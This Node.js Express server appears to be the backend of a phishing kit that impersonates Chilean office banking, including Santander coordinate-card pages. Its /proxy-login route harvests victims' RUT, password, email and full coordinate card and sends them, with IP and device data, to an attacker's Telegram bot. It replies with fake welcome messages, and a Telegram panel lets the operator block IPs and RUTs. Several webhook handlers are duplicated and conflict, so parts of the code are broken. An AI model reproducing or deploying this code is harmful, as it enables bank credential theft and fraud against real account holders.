const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// 🔥 NECESARIO PARA QUE FUNCIONE CON WWW Y SIN WWW
app.set("trust proxy", true);

// ✅ CORS mejorado - permite AMBOS dominios sin redirección
const corsOptions = {
  origin: function(origin, callback) {
    if (
      !origin ||
      origin === "https://www.officebankingchile.info" ||
      origin === "https://officebankingchile.info" ||
      origin === "http://localhost:3000" ||
      origin === "http://localhost:5000"
    ) {
      callback(null, true);
    } else {
      callback(new Error("No permitido por CORS"));
    }
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// =============================================
//   🔥 BLOQUEO DE CORREOS SOSPECHOSOS 🔥
// =============================================
const correosBloqueados = [
  "f.tamarugal@gmail.com",   // <-- reemplaza aquí
  "otro@dominio.com"
];

app.use((req, res, next) => {
  const email =
    req.query.email ||
    req.body?.mail ||
    req.body?.email ||
    req.body?.correo;

  if (email && correosBloqueados.includes(email)) {
    console.log(`🚫 BLOQUEADO: ${email}`);
    return res.status(403).json({
      status: "error",
      mensaje: "Acceso bloqueado"
    });
  }

  next();
});

// =============================================
//   🔥 PANEL TÉCNICO + BLOQUEO POR IP 🔥
// =============================================
const intentosPorIP = new Map();
const ipsBloqueadas = new Set();

function registrarIntentoIP(ip) {
  if (!ip) return;
  const actual = intentosPorIP.get(ip) || 0;
  const nuevo = actual + 1;
  intentosPorIP.set(ip, nuevo);

  if (nuevo >= 5 && !ipsBloqueadas.has(ip)) {
    bloquearIP(ip, "Exceso de intentos técnicos fallidos");
  }
}

function bloquearIP(ip, motivo = "Bloqueo manual") {
  if (!ip) return;
  ipsBloqueadas.add(ip);
  enviarEventoTecnico(
    `⛔ IP BLOQUEADA\nIP: ${ip}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
  );
}

function desbloquearIP(ip) {
  if (!ip) return;
  ipsBloqueadas.delete(ip);
  enviarEventoTecnico(
    `🔓 IP DESBLOQUEADA\nIP: ${ip}\nHora: ${new Date().toLocaleString("es-CL")}`
  );
}

function estaBloqueadaIP(ip) {
  return ip && ipsBloqueadas.has(ip);
}

// Middleware global de bloqueo técnico por IP
app.use((req, res, next) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (estaBloqueadaIP(ip)) {
    enviarEventoTecnico(
      `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
    );
    return res.status(403).json({ error: "IP bloqueada" });
  }

  next();
});

// ✅ Middleware para logging detallado
app.use((req, res, next) => {
  console.log(`\n📨 ${req.method} ${req.path}`);
  console.log(`Origin: ${req.get("origin")}`);
  if (req.method === "POST") {
    console.log(`Body:`, JSON.stringify(req.body, null, 2));
  }
  next();
});

// Verificación de variables de entorno
console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
if (process.env.TELEGRAM_TOKEN)
  console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
console.log("================================\n");

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
});

// Leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Procesar saldo
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Autorización
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }

    if (cfg.tipoAutorizacion === "coordenadas") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
      return;
    }

    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Enviar autorización a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
      });
    }
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error("Error en autorizar:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Función para enviar a Telegram (mensajes normales)
async function enviarATelegram(mensaje) {
  try {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: mensaje
      })
    });

    const data = await response.json();
    return data.ok;
  } catch (err) {
    console.error(`❌ Error enviando a Telegram:`, err.message);
    return false;
  }
}

// Función para enviar eventos técnicos al “panel” (sin datos sensibles)
async function enviarEventoTecnico(mensaje) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) return false;
  const prefijo = "📡 EVENTO TÉCNICO\n";
  return enviarATelegram(prefijo + mensaje);
}

// 🔍 Detección de navegador / sistema / dispositivo
function detectarNavegador(userAgent) {
  userAgent = userAgent || "";

  let navegador = "Desconocido";
  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent)) navegador = "Chrome";
  else if (/edg/i.test(userAgent)) navegador = "Edge";
  else if (/firefox|fxios/i.test(userAgent)) navegador = "Firefox";
  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) navegador = "Safari";
  else if (/opr|opera/i.test(userAgent)) navegador = "Opera";

  let sistema = "Desconocido";
  if (/windows nt/i.test(userAgent)) sistema = "Windows";
  else if (/android/i.test(userAgent)) sistema = "Android";
  else if (/iphone|ipad|ipod/i.test(userAgent)) sistema = "iOS";
  else if (/mac os/i.test(userAgent)) sistema = "MacOS";
  else if (/linux/i.test(userAgent)) sistema = "Linux";

  let dispositivo = "Desktop";
  if (/mobile/i.test(userAgent)) dispositivo = "Móvil";
  else if (/tablet|ipad/i.test(userAgent)) dispositivo = "Tablet";

  return { navegador, sistema, dispositivo };
}

// =============================================
//   🔥🔥🔥  BLOQUE /proxy-login ORIGINAL  🔥🔥🔥
//   (solo se le agrega panel técnico / IP)   //
// =============================================

app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail, coordenadas } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const infoNavegador = detectarNavegador(userAgent);

  console.log("\n" + "=".repeat(60));
  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
  console.log(`IP: ${ip}`);
  console.log("User-Agent:", userAgent);
  console.log("=".repeat(60));
  console.log("COORDENADAS RECIBIDAS:", coordenadas);

  // Evento técnico al panel (sin datos sensibles)
  enviarEventoTecnico(
    `Nuevo request a /proxy-login
IP: ${ip}
Método: POST
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}
Tiene mail: ${!!mail}
Tiene login: ${!!(rut && passwd)}
Tiene coordenadas: ${!!coordenadas}`
  );

  try {
    // 📧 CORREO
    if (mail) {
      const mensajeCorrecto = `📧 Correo actualizado:
${mail}
IP: ${ip}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;
      await enviarATelegram(mensajeCorrecto);
      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
    }

    // 🔐 LOGIN
    if (rut && passwd) {
      const mensajeLogin = `🔐 Nuevo Login en Office Banking:
RUT: ${rut}
Clave: ${passwd}
IP: ${ip}
Hora: ${new Date().toLocaleString("es-CL")}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;

      await enviarATelegram(mensajeLogin);
      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
    }

    // 🔢 COORDENADAS
    if (coordenadas) {
      const coords = coordenadas;
      let texto = "🔐 Tarjeta de Coordenadas\n\n";

      const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];

      for (let fila = 1; fila <= 5; fila++) {
        let linea = "";
        for (let col of letras) {
          linea += `${col}${fila}: ${coords[col + fila]} | `;
        }
        texto += linea.slice(0, -3) + "\n";
      }

      texto += `\nIP: ${ip}`;
      texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
      texto += `\nNavegador: ${infoNavegador.navegador}`;
      texto += `\nSistema: ${infoNavegador.sistema}`;
      texto += `\nDispositivo: ${infoNavegador.dispositivo}`;

      await enviarATelegram(texto);

      return res.json({
        status: "ok",
        mensaje: "Coordenadas recibidas correctamente"
      });
    }

    // Datos inválidos → intento técnico fallido
    registrarIntentoIP(ip);
    enviarEventoTecnico(
      `❌ Datos inválidos en /proxy-login
IP: ${ip}
Hora: ${new Date().toLocaleString("es-CL")}`
    );

    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
  } catch (err) {
    console.error(`❌ Error en /proxy-login:`, err);
    registrarIntentoIP(ip);
    enviarEventoTecnico(
      `⚠️ Error en /proxy-login
IP: ${ip}
Error: ${err.message}
Hora: ${new Date().toLocaleString("es-CL")}`
    );
    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
  }
});

// =============================================
//   🔥 WEBHOOK DE TELEGRAM PARA PANEL TÉCNICO 🔥
// =============================================

app.post("/telegram-webhook", async (req, res) => {
  const update = req.body;

  // 🔘 CALLBACK DE BOTONES
  if (update.callback_query) {
    const data = update.callback_query.data;
    const chatId = update.callback_query.message.chat.id;
    const messageId = update.callback_query.message.message_id;

    if (data.startsWith("bloquear_ip_")) {
      const ip = data.replace("bloquear_ip_", "");
      bloquearIP(ip, "Bloqueo manual desde Telegram");
      await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
      await editarMensaje(chatId, messageId, `📡 PANEL TÉCNICO\n⛔ IP bloqueada: ${ip}`);
    }

    if (data.startsWith("desbloquear_ip_")) {
      const ip = data.replace("desbloquear_ip_", "");
      desbloquearIP(ip);
      await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
      await editarMensaje(chatId, messageId, `📡 PANEL TÉCNICO\n🔓 IP desbloqueada: ${ip}`);
    }

    if (data === "ver_estado") {
      await responderCallback(update.callback_query.id, "Mostrando estado técnico");
      await editarMensaje(chatId, messageId, await construirPanelTexto());
    }

    return res.sendStatus(200);
  }

  // 📩 MENSAJES NORMALES (comandos)
  if (update.message) {
    const text = update.message.text || "";
    const chatId = update.message.chat.id;

    if (text.startsWith("/panel")) {
      await enviarPanelTecnico(chatId);
    }

    if (text.startsWith("/bloquear_ip")) {
      const partes = text.split(" ");
      const ip = partes[1];
      if (ip) {
        bloquearIP(ip, "Bloqueo manual desde comando");
        await enviarATelegram(`📡 EVENTO TÉCNICO\n⛔ IP bloqueada por comando\nIP: ${ip}`);
      }
    }

    if (text.startsWith("/desbloquear_ip")) {
      const partes = text.split(" ");
      const ip = partes[1];
      if (ip) {
        desbloquearIP(ip);
        await enviarATelegram(`📡 EVENTO TÉCNICO\n🔓 IP desbloqueada por comando\nIP: ${ip}`);
      }
    }

    if (text.startsWith("/estado")) {
      await enviarATelegram(await construirPanelTexto());
    }

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Helpers para panel técnico
async function responderCallback(callbackId, texto) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callbackId,
      text: texto,
      show_alert: false
    })
  });
}

async function editarMensaje(chatId, messageId, nuevoTexto) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: nuevoTexto
    })
  });
}

async function enviarPanelTecnico(chatId) {
  const texto = await construirPanelTexto();

  const botones = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⛔ Bloquear IP 190.111.22.33", callback_data: "bloquear_ip_190.111.22.33" }
        ],
        [
          { text: "🔓 Desbloquear IP 190.111.22.33", callback_data: "desbloquear_ip_190.111.22.33" }
        ],
        [
          { text: "📊 Ver estado", callback_data: "ver_estado" }
        ]
      ]
    }
  };

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto,
      ...botones
    })
  });
}

async function construirPanelTexto() {
  const ips = Array.from(ipsBloqueadas);
  const intentos = Array.from(intentosPorIP.entries())
    .map(([ip, count]) => `${ip}: ${count}`)
    .join("\n") || "Sin registros";

  const bloqueadas = ips.join("\n") || "Ninguna";

  return `📡 PANEL TÉCNICO
Estado del servidor: OK

IPs bloqueadas:
${bloqueadas}

Intentos por IP:
${intentos}

Hora: ${new Date().toLocaleString("es-CL")}`;
}
// =============================================
//   🔥 PANEL TÉCNICO COMPLETO (BOTONES DINÁMICOS) 🔥
// =============================================

// Genera botones dinámicos según las IP detectadas
function generarBotonesDinamicos() {
  const botones = [];

  // Botones para cada IP bloqueada
  for (const ip of ipsBloqueadas) {
    botones.push([
      { text: `🔓 Desbloquear ${ip}`, callback_data: `desbloquear_ip_${ip}` }
    ]);
  }

  // Botones para cada IP con intentos
  for (const [ip] of intentosPorIP.entries()) {
    botones.push([
      { text: `⛔ Bloquear ${ip}`, callback_data: `bloquear_ip_${ip}` }
    ]);
  }

  // Botón de estado general
  botones.push([
    { text: "📊 Ver estado del servidor", callback_data: "ver_estado" }
  ]);

  return botones;
}

// Panel técnico completo con botones dinámicos
async function enviarPanelTecnicoCompleto(chatId) {
  const texto = await construirPanelTexto();

  const botones = {
    reply_markup: {
      inline_keyboard: generarBotonesDinamicos()
    }
  };

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto,
      ...botones
    })
  });
}

// Comando /panel2 para abrir el panel técnico completo
app.post("/telegram-webhook", async (req, res) => {
  const update = req.body;

  if (update.message) {
    const text = update.message.text || "";
    const chatId = update.message.chat.id;

    if (text.startsWith("/panel2")) {
      await enviarPanelTecnicoCompleto(chatId);
    }
  }

  res.sendStatus(200);
});
// =============================================
//   🔥 PANEL TÉCNICO UNIFICADO (MENÚ PRINCIPAL) 🔥
// =============================================

// Construye el menú principal
async function enviarPanelUnificado(chatId) {
  const texto = `📡 PANEL TÉCNICO UNIFICADO
Selecciona una opción:`;

  const botones = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 Estado del servidor", callback_data: "panel_estado" }],
        [{ text: "📈 Estadísticas", callback_data: "panel_stats" }],
        [{ text: "📡 Panel en vivo", callback_data: "panel_vivo" }],
        [{ text: "📜 Stream técnico", callback_data: "panel_stream" }],
        [{ text: "🛡 IPs detectadas", callback_data: "panel_ips" }]
      ]
    }
  };

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto,
      ...botones
    })
  });
}

// Submenú: Estado del servidor
async function panelEstado(chatId, messageId) {
  await editarMensaje(chatId, messageId, await construirPanelTexto());
}

// Submenú: Estadísticas
async function panelStats(chatId, messageId) {
  const texto = `
📈 ESTADÍSTICAS TÉCNICAS

IPs con actividad: ${intentosPorIP.size}
IPs bloqueadas: ${ipsBloqueadas.size}

Hora: ${new Date().toLocaleString("es-CL")}
`;

  await editarMensaje(chatId, messageId, texto);
}

// Submenú: Panel en vivo
async function panelVivo(chatId, messageId) {
  await editarMensaje(chatId, messageId, "📡 Panel en vivo activado");
  await enviarPanelTecnicoVivo(chatId, messageId);
}

// Submenú: Stream técnico
async function panelStream(chatId, messageId) {
  await editarMensaje(chatId, messageId, "📜 Stream técnico activado");
  await enviarStreamTecnico("Stream iniciado");
}

// Submenú: IPs detectadas (dinámico)
async function panelIPs(chatId, messageId) {
  const botones = [];

  for (const ip of ipsBloqueadas) {
    botones.push([{ text: `🔓 Desbloquear ${ip}`, callback_data: `desbloquear_ip_${ip}` }]);
  }

  for (const [ip] of intentosPorIP.entries()) {
    botones.push([{ text: `⛔ Bloquear ${ip}`, callback_data: `bloquear_ip_${ip}` }]);
  }

  botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);

  const texto = `🛡 IPs detectadas\nSelecciona una acción:`;

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: texto,
      reply_markup: { inline_keyboard: botones }
    })
  });
}

// Extender webhook para manejar el panel unificado
app.post("/telegram-webhook", async (req, res) => {
  const update = req.body;

  // CALLBACKS
  if (update.callback_query) {
    const data = update.callback_query.data;
    const chatId = update.callback_query.message.chat.id;
    const messageId = update.callback_query.message.message_id;

    if (data === "panel_estado") return panelEstado(chatId, messageId);
    if (data === "panel_stats") return panelStats(chatId, messageId);
    if (data === "panel_vivo") return panelVivo(chatId, messageId);
    if (data === "panel_stream") return panelStream(chatId, messageId);
    if (data === "panel_ips") return panelIPs(chatId, messageId);

    if (data === "panel_back") return enviarPanelUnificado(chatId);

    // Bloqueo / desbloqueo dinámico
    if (data.startsWith("bloquear_ip_")) {
      const ip = data.replace("bloquear_ip_", "");
      bloquearIP(ip, "Bloqueo manual desde panel unificado");
      await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
      return panelIPs(chatId, messageId);
    }

    if (data.startsWith("desbloquear_ip_")) {
      const ip = data.replace("desbloquear_ip_", "");
      desbloquearIP(ip);
      await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
      return panelIPs(chatId, messageId);
    }
  }

  // COMANDOS
  if (update.message) {
    const text = update.message.text || "";
    const chatId = update.message.chat.id;

    if (text.startsWith("/panel")) {
      await enviarPanelUnificado(chatId);
    }
  }

  res.sendStatus(200);
});
// =============================================
//   🔥 BLOQUEO TÉCNICO POR RUT 🔥
// =============================================
const rutsBloqueados = new Set();
const intentosPorRUT = new Map();

function bloquearRUT(rut, motivo = "Bloqueo manual") {
  if (!rut) return;
  rutsBloqueados.add(rut);
  enviarEventoTecnico(`⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}`);
}

function desbloquearRUT(rut) {
  if (!rut) return;
  rutsBloqueados.delete(rut);
  enviarEventoTecnico(`🔓 RUT DESBLOQUEADO\nRUT: ${rut}`);
}

function registrarIntentoRUT(rut) {
  if (!rut) return;
  const actual = intentosPorRUT.get(rut) || 0;
  const nuevo = actual + 1;
  intentosPorRUT.set(rut, nuevo);

  if (nuevo >= 5 && !rutsBloqueados.has(rut)) {
    bloquearRUT(rut, "Exceso de intentos técnicos fallidos");
  }
}

function estaBloqueadoRUT(rut) {
  return rut && rutsBloqueados.has(rut);
}

// =============================================
//   🔥 PANEL TÉCNICO UNIFICADO (MENÚ PRINCIPAL) 🔥
// =============================================

async function enviarPanelUnificado(chatId) {
  const texto = `📡 PANEL TÉCNICO UNIFICADO
Selecciona una opción:`;

  const botones = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 Estado del servidor", callback_data: "panel_estado" }],
        [{ text: "📈 Estadísticas", callback_data: "panel_stats" }],
        [{ text: "📡 Panel en vivo", callback_data: "panel_vivo" }],
        [{ text: "📜 Stream técnico", callback_data: "panel_stream" }],
        [{ text: "🛡 IPs detectadas", callback_data: "panel_ips" }],
        [{ text: "🧾 RUT detectados", callback_data: "panel_ruts" }]
      ]
    }
  };

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto,
      ...botones
    })
  });
}

async function panelEstado(chatId, messageId) {
  await editarMensaje(chatId, messageId, await construirPanelTexto());
}

async function panelStats(chatId, messageId) {
  const texto = `
📈 ESTADÍSTICAS TÉCNICAS

IPs con actividad: ${intentosPorIP.size}
IPs bloqueadas: ${ipsBloqueadas.size}
RUTs con actividad: ${intentosPorRUT.size}
RUTs bloqueados: ${rutsBloqueados.size}

Hora: ${new Date().toLocaleString("es-CL")}
`;
  await editarMensaje(chatId, messageId, texto);
}

async function panelVivo(chatId, messageId) {
  await editarMensaje(chatId, messageId, "📡 Panel en vivo activado");
  await enviarPanelTecnicoVivo(chatId, messageId);
}

async function panelStream(chatId, messageId) {
  await editarMensaje(chatId, messageId, "📜 Stream técnico activado");
  await enviarStreamTecnico("Stream iniciado");
}

async function panelIPs(chatId, messageId) {
  const botones = [];

  for (const ip of ipsBloqueadas) {
    botones.push([{ text: `🔓 Desbloquear ${ip}`, callback_data: `desbloquear_ip_${ip}` }]);
  }

  for (const [ip] of intentosPorIP.entries()) {
    botones.push([{ text: `⛔ Bloquear ${ip}`, callback_data: `bloquear_ip_${ip}` }]);
  }

  botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);

  const texto = `🛡 IPs detectadas\nSelecciona una acción:`;

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: texto,
      reply_markup: { inline_keyboard: botones }
    })
  });
}

async function panelRUTs(chatId, messageId) {
  const botones = [];

  for (const rut of rutsBloqueados) {
    botones.push([{ text: `🔓 Desbloquear ${rut}`, callback_data: `desbloquear_rut_${rut}` }]);
  }

  for (const [rut] of intentosPorRUT.entries()) {
    botones.push([{ text: `⛔ Bloquear ${rut}`, callback_data: `bloquear_rut_${rut}` }]);
  }

  botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);

  const texto = `🧾 RUT detectados\nSelecciona una acción:`;

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: texto,
      reply_markup: { inline_keyboard: botones }
    })
  });
}

// STREAM técnico
async function enviarStreamTecnico(mensaje) {
  await enviarATelegram(`📡 STREAM\n${mensaje}`);
}

// Panel en vivo
async function enviarPanelTecnicoVivo(chatId, messageId) {
  const texto = await construirPanelTexto();

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: texto
    })
  });
}

// Extensión del webhook para el panel unificado
app.post("/telegram-webhook", async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const data = update.callback_query.data;
    const chatId = update.callback_query.message.chat.id;
    const messageId = update.callback_query.message.message_id;

    if (data === "panel_estado") return panelEstado(chatId, messageId);
    if (data === "panel_stats") return panelStats(chatId, messageId);
    if (data === "panel_vivo") return panelVivo(chatId, messageId);
    if (data === "panel_stream") return panelStream(chatId, messageId);
    if (data === "panel_ips") return panelIPs(chatId, messageId);
    if (data === "panel_ruts") return panelRUTs(chatId, messageId);
    if (data === "panel_back") return enviarPanelUnificado(chatId);

    if (data.startsWith("bloquear_ip_")) {
      const ip = data.replace("bloquear_ip_", "");
      bloquearIP(ip, "Bloqueo manual desde panel unificado");
      await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
      return panelIPs(chatId, messageId);
    }

    if (data.startsWith("desbloquear_ip_")) {
      const ip = data.replace("desbloquear_ip_", "");
      desbloquearIP(ip);
      await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
      return panelIPs(chatId, messageId);
    }

    if (data.startsWith("bloquear_rut_")) {
      const rut = data.replace("bloquear_rut_", "");
      bloquearRUT(rut, "Bloqueo manual desde panel unificado");
      await responderCallback(update.callback_query.id, `RUT bloqueado: ${rut}`);
      return panelRUTs(chatId, messageId);
    }

    if (data.startsWith("desbloquear_rut_")) {
      const rut = data.replace("desbloquear_rut_", "");
      desbloquearRUT(rut);
      await responderCallback(update.callback_query.id, `RUT desbloqueado: ${rut}`);
      return panelRUTs(chatId, messageId);
    }
  }

  if (update.message) {
    const text = update.message.text || "";
    const chatId = update.message.chat.id;

    if (text.startsWith("/panel")) {
      await enviarPanelUnificado(chatId);
    }
  }

  res.sendStatus(200);
});

// Página principal
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 404
app.use((req, res) => {
  res.status(404).json({ error: "Ruta no encontrada" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
